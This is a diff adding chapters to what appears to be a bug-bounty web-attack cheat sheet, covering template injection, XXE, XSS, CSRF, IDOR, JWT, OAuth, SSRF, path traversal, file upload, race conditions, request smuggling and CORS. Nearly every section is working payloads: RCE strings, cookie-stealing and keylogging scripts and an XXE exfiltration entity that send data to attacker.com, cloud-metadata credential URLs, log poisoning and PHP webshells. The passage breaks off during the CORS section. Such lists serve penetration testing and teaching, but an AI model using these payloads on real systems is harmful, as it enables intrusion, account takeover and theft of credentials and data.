+<span class="ce">#{7*7}</span>          → <span class="cv">49</span>  (Ruby)
+<span class="ce">*{7*7}</span>          → <span class="cv">49</span>  (Spring EL)
+<span class="ce">{{7*'7'}}</span>       → <span class="cv">7777777</span> (Jinja2)
+<span class="ce">{{7*'7'}}</span>       → <span class="cv">49</span>      (Twig — different result identifies engine)</span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">RCE Payloads by Engine</div>
+        <pre><span class="cm"># Jinja2 (Python) — RCE</span>
+<span class="ce">{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</span>
+<span class="ce">{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}</span>
+<span class="ce">{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</span>
+
+<span class="cm"># Twig (PHP) — RCE</span>
+<span class="ce">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</span>
+
+<span class="cm"># FreeMarker (Java) — RCE</span>
+<span class="ce"><#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}</span>
+
+<span class="cm"># Pebble (Java)</span>
+<span class="ce">{%25 set cmd = 'id' %25}{{cmd}}</span>
+
+<span class="cm"># Smarty (PHP)</span>
+<span class="ce">{php}echo `id`;{/php}</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- XXE -->
+<section class="section" id="xxe">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 09</div>
+    <h2>XML External Entity (XXE)</h2>
+    <p class="section-intro">When XML input is parsed by a misconfigured parser that processes external entity references. Allows reading local files, SSRF, and potentially RCE.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">XXE — All Attack Variants</div><div class="vuln-card-subtitle">File read, SSRF, blind, SVG, XLSX vectors</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">Basic XXE - Local File Read</div>
+        <pre><span class="cm">&lt;!-- Replace normal XML body with: --></span>
+<span class="ce">&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+&lt;root>&amp;xxe;&lt;/root></span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">XXE via SVG Upload (Common Bypass)</div>
+        <pre><span class="cm">&lt;!-- Upload as .svg image file --></span>
+<span class="ce">&lt;?xml version="1.0" standalone="yes"?>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+&lt;svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+  &lt;text y="20">&amp;xxe;&lt;/text>
+&lt;/svg></span>
+
+<span class="cm">&lt;!-- Also works in: DOCX, XLSX, PPTX, XSD, WSDL files --></span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">Blind XXE via Out-of-Band</div>
+        <pre><span class="ce">&lt;?xml version="1.0"?>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd">
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+&lt;foo>&amp;send;&lt;/foo></span>
+
+<span class="cm">&lt;!-- evil.dtd on attacker server: --></span>
+<span class="cv">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
+%all;</span></pre>
+      </div>
+      <div class="box box-blue">
+        <strong>Where to Find XXE</strong>
+        Any endpoint accepting XML input. Also test: file upload (DOCX, ODT, SVG, PDF), SOAP APIs, RSS/Atom feeds, Import features, SAML authentication endpoints, REST APIs with Content-Type: application/xml.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- XSS -->
+<section class="section" id="xss">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 10 — CLIENT-SIDE ATTACKS</div>
+    <h2>Cross-Site Scripting (XSS)</h2>
+    <p class="section-intro">XSS allows injecting malicious scripts into pages viewed by other users. Can steal cookies, capture keystrokes, hijack accounts, redirect users, and deface sites.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">Reflected XSS</div><div class="vuln-card-subtitle">Payload in URL, reflected immediately in response</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">Reflected XSS Detection</div>
+        <pre><span class="cm"># Inject in: search, error messages, username fields, URL params</span>
+<span class="ce">&lt;script>alert(1)&lt;/script></span>
+<span class="ce">&lt;img src=x onerror=alert(1)></span>
+<span class="ce">&lt;svg onload=alert(1)></span>
+<span class="ce">">&lt;script>alert(1)&lt;/script></span>
+<span class="ce">javascript:alert(1)</span>
+<span class="ce">&lt;a href="javascript:alert(1)">click&lt;/a></span>
+
+<span class="cm"># Filter bypass techniques</span>
+<span class="ce">&lt;ScRiPt>alert(1)&lt;/sCrIpT></span>       <span class="cm"># case variation</span>
+<span class="ce">&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)></span> <span class="cm"># HTML entities</span>
+<span class="ce">&lt;svg/onload=alert`1`></span>             <span class="cm"># template literal, no parens</span>
+<span class="ce">&lt;img src=1 href=1 onerror="javascript:alert(1)">&lt;/img></span>
+<span class="ce">%3Cscript%3Ealert(1)%3C/script%3E</span>  <span class="cm"># URL encoded</span>
+<span class="ce">&lt;script>eval(atob('YWxlcnQoMSk='))&lt;/script></span>  <span class="cm"># base64</span>
+<span class="ce">&lt;details open ontoggle=alert(1)></span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">Stored XSS</div><div class="vuln-card-subtitle">Payload saved to database, executed for every viewer</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>Store XSS in: comments, usernames, profile bios, product reviews, support tickets, chat messages, order notes, address fields.</p>
+      <div class="code-wrap">
+        <div class="code-label">Account Takeover via Stored XSS</div>
+        <pre><span class="cm"># Steal session cookie and send to attacker</span>
+<span class="ce">&lt;script>
+  fetch('https://attacker.com/steal?c='+document.cookie)
+&lt;/script></span>
+
+<span class="cm"># Keylogger</span>
+<span class="ce">&lt;script>
+  document.onkeypress = function(e) {
+    fetch('https://attacker.com/keys?k='+e.key);
+  };
+&lt;/script></span>
+
+<span class="cm"># Credential harvester (inject fake login form)</span>
+<span class="ce">&lt;script>
+  document.body.innerHTML='&lt;form action="https://attacker.com/log" method="POST">' +
+    '&lt;input name="user">&lt;input name="pass" type="password">&lt;button>Login&lt;/button>&lt;/form>';
+&lt;/script></span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">DOM-Based XSS</div><div class="vuln-card-subtitle">Sink-source vulnerability in client-side JavaScript</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>Payload never reaches the server. Injected into the DOM by unsafe JavaScript reading from URL fragments or other client-side sources.</p>
+      <div class="two-col">
+        <div class="mini-card">
+          <div class="mc-title">Dangerous Sources</div>
+          <ul class="blist">
+            <li><code>location.hash</code></li>
+            <li><code>location.search</code></li>
+            <li><code>location.href</code></li>
+            <li><code>document.referrer</code></li>
+            <li><code>window.name</code></li>
+            <li><code>postMessage</code> data</li>
+          </ul>
+        </div>
+        <div class="mini-card">
+          <div class="mc-title">Dangerous Sinks</div>
+          <ul class="blist red">
+            <li><code>innerHTML</code></li>
+            <li><code>document.write()</code></li>
+            <li><code>eval()</code></li>
+            <li><code>setTimeout(str)</code></li>
+            <li><code>setInterval(str)</code></li>
+            <li><code>location.href = input</code></li>
+            <li><code>$.html()</code></li>
+          </ul>
+        </div>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">DOM XSS - Fragment Injection</div>
+        <pre><span class="cm"># If JS does: document.getElementById('x').innerHTML = location.hash.slice(1)</span>
+<span class="cm"># Visit: </span>
+https://target.com/page<span class="ce">#&lt;img src=x onerror=alert(1)></span>
+
+<span class="cm"># Blind DOM XSS — use XSS Hunter to detect</span>
+<span class="ce">&lt;script src="https://yourxsshunter.xss.ht">&lt;/script></span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CSRF -->
+<section class="section" id="csrf">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 11</div>
+    <h2>Cross-Site Request Forgery (CSRF)</h2>
+    <p class="section-intro">Forces an authenticated user's browser to perform unwanted actions on a site they're logged into. The server can't distinguish a legitimate request from a forged one.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">CSRF Detection & PoC Generation</div><div class="vuln-card-subtitle">Token validation, SameSite bypass, JSON CSRF</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">CSRF PoC — Auto-Submit Form</div>
+        <pre><span class="cm">&lt;!-- Host on attacker.com, send link to victim --></span>
+<span class="cv">&lt;html>
+&lt;body onload="document.forms[0].submit()">
+  &lt;form method="POST" action="https://target.com/account/email/change">
+    &lt;input type="hidden" name="email" value="attacker@evil.com">
+    &lt;input type="hidden" name="confirm" value="attacker@evil.com">
+  &lt;/form>
+&lt;/body>
+&lt;/html></span></pre>
+      </div>
+      <h4>CSRF Token Bypass Techniques</h4>
+      <ul class="blist">
+        <li>Remove the CSRF token parameter entirely — does server still accept?</li>
+        <li>Use a valid token from your own account (tokens not tied to session?)</li>
+        <li>Change method from POST to GET</li>
+        <li>Change Content-Type to text/plain (bypass CORS preflight)</li>
+        <li>Use HTML form to submit JSON: <code>{"email":"x@x.com&&extra=y"}</code></li>
+        <li>Exploit Referrer header bypass (empty Referer via <code>&lt;meta name="referrer" content="no-referrer"></code>)</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- IDOR -->
+<section class="section" id="idor">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 12 — ACCESS CONTROL</div>
+    <h2>IDOR / Broken Object Level Authorization</h2>
+    <p class="section-intro">The most commonly reported vulnerability in bug bounty programs. Server trusts client-supplied IDs without verifying ownership. Change an ID, access another user's data.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">IDOR — Complete Testing Methodology</div><div class="vuln-card-subtitle">IDs, GUIDs, usernames, emails, numeric IDs</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">IDOR Testing — URL, Header, Body Parameters</div>
+        <pre><span class="cm"># 1. Numeric ID manipulation</span>
+GET /api/invoice/<span class="ce">1001</span>  → try <span class="ce">1002, 1003, 1000</span>
+GET /user/<span class="ce">1234</span>/settings → try <span class="ce">1235</span>
+
+<span class="cm"># 2. GUID/UUID — often predictable or leaked in responses</span>
+GET /api/order/<span class="ce">550e8400-e29b-41d4-a716-446655440000</span>
+
+<span class="cm"># 3. Parameter tampering in POST body</span>
+POST /api/user/update
+{"user_id": <span class="ce">1234</span>, "email": "new@email.com"}
+<span class="cm"># Change user_id to victim's ID</span>
+
+<span class="cm"># 4. HTTP parameter pollution</span>
+GET /api/user?id=<span class="ce">YOUR_ID</span>&id=<span class="ce">VICTIM_ID</span>
+
+<span class="cm"># 5. Header-based IDOR</span>
+X-User-ID: <span class="ce">victim_id</span>
+X-Account-ID: <span class="ce">victim_id</span>
+
+<span class="cm"># 6. Indirect reference (hash/username)</span>
+GET /download?file=<span class="ce">../user2/invoice.pdf</span>
+GET /profile?username=<span class="ce">victimuser</span></pre>
+      </div>
+      <div class="box box-green">
+        <strong>IDOR Testing Setup</strong>
+        Create TWO accounts (Account A and Account B). Log in as A, capture all requests. Log in as B, replace B's session cookie in every request from A. Check if A's data is returned with B's auth. Burp Suite's "Match and Replace" makes this systematic.
+      </div>
+      <h4>Chained IDOR Attacks</h4>
+      <ul class="blist">
+        <li>IDOR + PII exposure → read another user's personal data</li>
+        <li>IDOR + account takeover → change victim's email/password</li>
+        <li>IDOR + financial manipulation → view/modify others' payment methods</li>
+        <li>IDOR + privilege escalation → access admin endpoints</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- JWT -->
+<section class="section" id="jwt">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 13</div>
+    <h2>JWT Attacks</h2>
+    <p class="section-intro">JSON Web Tokens are widely misimplemented. Vulnerabilities range from algorithm confusion to key confusion to secret brute forcing.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">JWT Attacks — Algorithm Confusion, None, Brute Force</div><div class="vuln-card-subtitle">alg:none, RS256→HS256, weak secrets</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">JWT Attack Vectors</div>
+        <pre><span class="cm"># 1. Algorithm: none attack</span>
+<span class="cm"># Decode JWT, change alg to "none", remove signature</span>
+<span class="cm"># Modified header:</span>
+<span class="ce">{"alg": "none", "typ": "JWT"}</span>
+<span class="cm"># Modified payload:</span>
+<span class="ce">{"sub": "admin", "role": "admin", "exp": 9999999999}</span>
+<span class="cm"># Token: base64(header).base64(payload).  (empty signature)</span>
+
+<span class="cm"># 2. RS256 → HS256 confusion</span>
+<span class="cm"># If server uses RSA, get public key, re-sign with HS256 using public key as secret</span>
+python3 -c "
+import jwt
+with open('public.pem') as f: pubkey = f.read()
+token = jwt.encode({'sub':'admin'}, pubkey, algorithm='HS256')
+print(token)
+"
+
+<span class="cm"># 3. Brute force weak secret</span>
+<span class="ck">hashcat</span> -a 0 -m 16500 token.txt /wordlists/rockyou.txt
+<span class="ck">john</span> --wordlist=/wordlists/rockyou.txt --format=HMAC-SHA256 token.txt
+
+<span class="cm"># 4. Embedded JWK attack (inject own public key)</span>
+<span class="cm"># Add "jwk" claim to header with your own public key</span>
+<span class="cm"># Sign with your private key — server trusts the embedded key</span>
+
+<span class="cm"># Tool: jwt_tool by ticarpi</span>
+python3 jwt_tool.py <span class="cs">TOKEN</span> -X a    <span class="cm"># alg:none</span>
+python3 jwt_tool.py <span class="cs">TOKEN</span> -X s    <span class="cm"># HS/RSA confusion</span>
+python3 jwt_tool.py <span class="cs">TOKEN</span> -C -d wordlist.txt  <span class="cm"># crack</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- OAUTH -->
+<section class="section" id="oauth">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 14</div>
+    <h2>OAuth 2.0 Misconfigurations</h2>
+    <p class="section-intro">OAuth is complex and subtle to implement correctly. Misconfigurations can lead to account takeover, authorization code theft, and open redirect chains.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">OAuth Attack Checklist</div><div class="vuln-card-subtitle">State validation, redirect_uri, PKCE bypass, token leakage</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <ul class="blist">
+        <li><strong>Missing state parameter:</strong> No CSRF protection on OAuth flow. Craft forged authorization URL, trick victim into visiting, steal their code.</li>
+        <li><strong>Redirect URI manipulation:</strong> Try <code>redirect_uri=https://attacker.com</code>, open subdirectory traversal, URL fragment injection.</li>
+        <li><strong>Code reuse:</strong> Authorization codes should be single-use. Try replaying a used code.</li>
+        <li><strong>Token leakage via Referer:</strong> If access token is in URL fragment and page has external resources, token leaks in Referer header.</li>
+        <li><strong>Implicit flow:</strong> Token returned in URL fragment — leaks to server logs, analytics, Referer headers.</li>
+        <li><strong>Scope manipulation:</strong> Request broader scopes than granted by user. Try adding <code>scope=admin</code>.</li>
+      </ul>
+      <div class="code-wrap">
+        <div class="code-label">Redirect URI Bypass Techniques</div>
+        <pre><span class="cm"># Exact match bypass</span>
+redirect_uri=https://target.com/callback<span class="ce">@attacker.com</span>
+redirect_uri=https://target.com/callback<span class="ce">%40attacker.com</span>
+redirect_uri=https://target.com<span class="ce">/../../attacker.com</span>
+redirect_uri=https://<span class="ce">attacker.com</span>#target.com/callback
+redirect_uri=https://target.com.attacker.com/callback
+
+<span class="cm"># Open redirect chain (target.com/redirect?to=attacker.com)</span>
+redirect_uri=https://target.com/<span class="ce">redirect?to=https://attacker.com</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SSRF -->
+<section class="section" id="ssrf">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 15 — SERVER-SIDE ATTACKS</div>
+    <h2>Server-Side Request Forgery (SSRF)</h2>
+    <p class="section-intro">Force the server to make requests on your behalf. Access internal services, cloud metadata APIs, and in some cases achieve RCE. One of the highest-impact bug bounty findings.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">SSRF — Detection, Bypass & Cloud Exploitation</div><div class="vuln-card-subtitle">Metadata APIs, internal network, blind SSRF</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>Look for: URL parameters, webhook URLs, file import from URL, PDF generators with external content, image loading from URL, proxy features.</p>
+      <div class="code-wrap">
+        <div class="code-label">SSRF Payloads & Cloud Metadata</div>
+        <pre><span class="cm"># Basic internal network access</span>
+url=<span class="ce">http://localhost/admin</span>
+url=<span class="ce">http://127.0.0.1/</span>
+url=<span class="ce">http://0.0.0.0/</span>
+url=<span class="ce">http://[::1]/</span>
+url=<span class="ce">http://internal.corp.com/</span>
+
+<span class="cm"># AWS EC2 Metadata (critical — can expose IAM credentials!)</span>
+url=<span class="ce">http://169.254.169.254/latest/meta-data/</span>
+url=<span class="ce">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+url=<span class="ce">http://169.254.170.2/v2/credentials</span>  <span class="cm"># ECS</span>
+url=<span class="ce">http://fd00:ec2::254/latest/meta-data/</span>  <span class="cm"># IPv6</span>
+
+<span class="cm"># GCP Metadata</span>
+url=<span class="ce">http://metadata.google.internal/computeMetadata/v1/</span>
+url=<span class="ce">http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token</span>
+
+<span class="cm"># Azure Metadata</span>
+url=<span class="ce">http://169.254.169.254/metadata/instance?api-version=2021-02-01</span>
+
+<span class="cm"># Internal port scanning via SSRF</span>
+url=<span class="ce">http://127.0.0.1:6379/</span>   <span class="cm"># Redis</span>
+url=<span class="ce">http://127.0.0.1:9200/</span>   <span class="cm"># Elasticsearch</span>
+url=<span class="ce">http://127.0.0.1:8080/</span>   <span class="cm"># Internal app</span>
+url=<span class="ce">http://127.0.0.1:5984/</span>   <span class="cm"># CouchDB</span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">SSRF Filter Bypass Techniques</div>
+        <pre><span class="cm"># IP representation bypasses</span>
+<span class="ce">http://2130706433/</span>         <span class="cm"># decimal of 127.0.0.1</span>
+<span class="ce">http://0x7f000001/</span>         <span class="cm"># hex</span>
+<span class="ce">http://0177.0.0.1/</span>         <span class="cm"># octal</span>
+<span class="ce">http://127.1/</span>              <span class="cm"># shortened</span>
+<span class="ce">http://127.0.0.1.nip.io/</span>   <span class="cm"># DNS rebinding</span>
+
+<span class="cm"># Protocol switching</span>
+<span class="ce">file:///etc/passwd</span>
+<span class="ce">dict://127.0.0.1:6379/info</span>  <span class="cm"># Redis via dict protocol</span>
+<span class="ce">gopher://127.0.0.1:6379/_*1%0d%0a...</span>  <span class="cm"># Gopher for Redis</span>
+
+<span class="cm"># Redirect-based bypass</span>
+<span class="cm"># Host a page on attacker.com that 302-redirects to 169.254.169.254</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PATH TRAVERSAL -->
+<section class="section" id="path-traversal">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 16</div>
+    <h2>Path Traversal / Local File Inclusion</h2>
+    <p class="section-intro">Read arbitrary files from the server filesystem. At worst, include remote code and achieve RCE via Log Poisoning or PHP filter chains.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">Path Traversal & LFI — Full Arsenal</div><div class="vuln-card-subtitle">File read, log poisoning, PHP wrappers, RCE</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">Path Traversal Payloads</div>
+        <pre><span class="cm"># Basic traversal</span>
+?file=<span class="ce">../../../etc/passwd</span>
+?file=<span class="ce">....//....//....//etc/passwd</span>
+?file=<span class="ce">..%2F..%2F..%2Fetc%2Fpasswd</span>         <span class="cm"># URL encoded</span>
+?file=<span class="ce">..%252F..%252F..%252Fetc%252Fpasswd</span>  <span class="cm"># double encoded</span>
+?file=<span class="ce">/%5C../%5C../etc/passwd</span>            <span class="cm"># backslash</span>
+?file=<span class="ce">....\/....\/....\/etc/passwd</span>
+
+<span class="cm"># Target sensitive files</span>
+/etc/passwd          <span class="cm"># user accounts</span>
+/etc/shadow          <span class="cm"># password hashes</span>
+/etc/hosts           <span class="cm"># internal hostnames</span>
+/proc/self/environ   <span class="cm"># env variables (contains secrets)</span>
+/proc/self/cmdline   <span class="cm"># running command</span>
+/var/log/apache2/access.log  <span class="cm"># for log poisoning</span>
+/app/.env            <span class="cm"># app secrets</span>
+~/.ssh/id_rsa        <span class="cm"># SSH private key</span>
+/var/www/html/config.php</pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">PHP LFI to RCE via Log Poisoning</div>
+        <pre><span class="cm"># Step 1: Poison Apache access log via User-Agent</span>
+curl -A "<span class="ce">&lt;?php system(\$_GET['cmd']); ?></span>" https://target.com/
+
+<span class="cm"># Step 2: Include the log file</span>
+?file=<span class="ce">/var/log/apache2/access.log</span>&cmd=id
+
+<span class="cm"># PHP wrappers (LFI to RCE / source disclosure)</span>
+?file=<span class="ce">php://filter/convert.base64-encode/resource=/etc/passwd</span>
+?file=<span class="ce">php://filter/read=string.rot13/resource=config.php</span>
+?file=<span class="ce">php://input</span>  <span class="cm"># POST body as PHP code</span>
+?file=<span class="ce">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==</span>
+?file=<span class="ce">expect://id</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FILE UPLOAD -->
+<section class="section" id="file-upload">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 17</div>
+    <h2>File Upload Bypass</h2>
+    <p class="section-intro">Unrestricted file upload is a direct path to RCE. Even restricted uploads can lead to XSS, SSRF, XXE, path traversal, and DoS.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">File Upload Bypass — Complete Methodology</div><div class="vuln-card-subtitle">Extension bypass, MIME bypass, content bypass, polyglots</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">Extension Bypass Techniques</div>
+        <pre><span class="cm"># PHP webshell variations</span>
+<span class="ce">shell.php</span>
+<span class="ce">shell.php3 / .php4 / .php5 / .php7 / .phtml / .phar / .phps</span>
+<span class="ce">shell.PHP</span>              <span class="cm"># case variation</span>
+<span class="ce">shell.php.jpg</span>          <span class="cm"># double extension</span>
+<span class="ce">shell.php%00.jpg</span>       <span class="cm"># null byte (older systems)</span>
+<span class="ce">shell.php.xxxxx</span>        <span class="cm"># add junk extension</span>
+<span class="ce">shell.asp;.jpg</span>         <span class="cm"># ASP semicolon bypass</span>
+<span class="ce">shell.aspx</span>
+<span class="ce">shell.jsp / .jspx</span>
+
+<span class="cm"># MIME type manipulation</span>
+<span class="cm"># Change Content-Type header from application/x-php to image/jpeg</span>
+
+<span class="cm"># Magic bytes bypass</span>
+<span class="cm"># Add GIF header: GIF89a; before PHP code</span>
+<span class="ce">GIF89a;&lt;?php system($_GET['cmd']); ?></span>
+
+<span class="cm"># Polyglot files (valid image AND valid PHP)</span>
+<span class="cm"># Use exiftool to inject into EXIF comment field</span>
+exiftool -Comment='&lt;?php system($_GET["cmd"]); ?>' image.jpg
+<span class="cm"># Then try to include the file via LFI</span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">Minimal PHP Webshell</div>
+        <pre><span class="cm">&lt;?php system($_GET['cmd']); ?></span>
+
+<span class="cm"># Usage: https://target.com/uploads/shell.php?cmd=id</span>
+<span class="cm"># More robust shell:</span>
+<span class="ce">&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre>"; die; } ?></span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- RACE CONDITIONS -->
+<section class="section" id="race-condition">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 18</div>
+    <h2>Race Conditions</h2>
+    <p class="section-intro">When multiple requests execute concurrently and the application doesn't handle the state correctly. Can lead to double-spend, multiple coupon use, duplicate rewards, and bypassing rate limits.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">Race Condition Testing</div><div class="vuln-card-subtitle">Burp Turbo Intruder, coupon bypass, double-spend</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>Target: coupon application, gift card redemption, money transfers, vote buttons, email verification, rate-limited endpoints.</p>
+      <div class="code-wrap">
+        <div class="code-label">Burp Turbo Intruder — Race Condition Script</div>
+        <pre><span class="cm"># Single-packet attack (HTTP/2) — all requests arrive simultaneously</span>
+<span class="cm"># In Turbo Intruder:</span>
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    for i in range(20):
+        engine.queue(target.req, target.baseInput, gate='race')
+
+    engine.openGate('race')
+
+def handleResponse(req, interesting):
+    <span class="cm"># Check for 200 OK on multiple requests</span>
+    if req.status == 200:
+        table.add(req)</pre>
+      </div>
+      <div class="box box-amber">
+        <strong>High-Value Race Condition Targets</strong>
+        One-time coupon codes, referral bonuses, daily reward limits, free trial activation, password reset token consumption, API rate limits, purchase quantity validation, inventory checks before payment.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- HTTP SMUGGLING -->
+<section class="section" id="smuggling">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 19</div>
+    <h2>HTTP Request Smuggling</h2>
+    <p class="section-intro">Exploit discrepancies between front-end (CDN/proxy) and back-end server HTTP parsing. Can bypass access controls, poison caches, capture other users' requests.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">HTTP Smuggling — CL.TE / TE.CL / TE.TE</div><div class="vuln-card-subtitle">Detection, exploitation, cache poisoning via smuggling</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">CL.TE Smuggling (Front-end uses CL, Back-end uses TE)</div>
+        <pre>POST / HTTP/1.1
+Host: target.com
+Content-Length: <span class="ce">13</span>
+Transfer-Encoding: chunked
+
+<span class="ce">0
+
+SMUGGLED</span>
+
+<span class="cm"># TE.CL variant</span>
+POST / HTTP/1.1
+Host: target.com
+Content-Length: <span class="ce">3</span>
+Transfer-Encoding: chunked
+
+<span class="ce">8
+SMUGGLED
+0</span>
+
+<span class="cm"># Use Burp's HTTP Request Smuggler extension to detect</span>
+<span class="cm"># Tool: smuggler.py by defparam</span>
+python3 smuggler.py -u https://target.com/</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CORS -->
+<section class="section" id="cors">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 20 — INFRASTRUCTURE</div>
+    <h2>CORS Misconfiguration</h2>
+    <p class="section-intro">Cross-Origin Resource Sharing misconfigurations allow malicious websites to make credentialed requests to target APIs and read sensitive responses.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">CORS Testing & Exploitation</div><div class="vuln-card-subtitle">Origin reflection, null origin, trusted subdomain</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">CORS Detection</div>
+        <pre><span class="cm"># Test 1: Does it reflect arbitrary Origin?</span>
+curl -H "Origin: https://evil.com" -I https://api.target.com/user
+<span class="cm"># If response has: Access-Control-Allow-Origin: https://evil.com</span>
